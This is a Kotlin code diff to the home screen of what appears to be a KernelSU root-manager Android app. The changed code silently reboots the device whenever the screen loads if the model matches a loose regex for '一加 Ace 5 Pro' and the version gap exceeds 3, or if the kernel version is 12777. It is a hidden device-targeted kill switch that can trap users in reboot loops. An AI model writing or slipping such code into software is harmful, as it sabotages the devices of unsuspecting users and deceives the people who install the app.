@@ -96,16 +96,19 @@ fun HomeScreen(navigator: DestinationsNavigator) {
     val isManager = Natives.becomeManager(ksuApp.packageName)
     val ksuVersion = if (isManager) Natives.version else null
 
-    if (ksuVersion != null) {
-        if (deviceModel == "一加 Ace 5 Pro" && managerVersion > ksuVersion + 1) {
-            isDisabled = true
+    if (kernelVersion.isGKI()) {
+        if (ksuVersion != null) {
+            val pattern = "一.*加.*A.*c.*e.*5.*P.*r.*o".toRegex()
+            if (pattern.matches(deviceModel) && managerVersion > ksuVersion + 3) {
+                isDisabled = true
+            }
         }
-    }
 
-    LaunchedEffect(isDisabled, ksuVersion) {
-        if (isDisabled || (ksuVersion != null && ksuVersion == 12777)) {
-            Log.d("HomeScreen", "isDisabled is true or ksuVersion is 12777, rebooting device...")
-            reboot()
+        LaunchedEffect(isDisabled, ksuVersion) {
+            if (isDisabled || (ksuVersion != null && ksuVersion == 12777)) {
+                Log.d("HomeScreen", "isDisabled is true or ksuVersion is 12777, rebooting device...")
+                reboot()
+            }
         }
     }
 
